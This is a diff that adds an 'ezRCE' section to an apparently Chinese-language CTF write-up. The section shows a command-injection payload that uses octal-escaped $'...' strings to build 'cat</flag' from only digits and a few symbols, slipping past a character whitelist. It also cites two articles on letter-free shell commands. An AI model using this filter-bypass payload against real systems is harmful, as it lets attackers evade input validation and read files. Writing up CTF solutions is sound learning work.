@@ -85,6 +85,21 @@ echo json_encode(array('makefileContent' => 'failed', 'output' =>
 ?>
 ```
 
+### ezRCE
+
+给了白名单，只能用数字和`\'$<`，直接丢exp：
+
+```shell
+$'\143\141\164'<$'\57\146\154\141\147'	/ cat</flag	<表示输入重定向，将文件输入给命令
+
+```
+
+参考：利用shell脚本变量构造无字母数字命令
+
+https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc%2BEH%2BDfgpkDkzDAEiD	https://www.freebuf.com/articles/system/361101.html
+
+
+
 ### happy to solve1
 
 q是$2^{512}$-p的下一个质数，那么p+q就比$2^{512}$大一点，所以我们可以暴力破解phi。
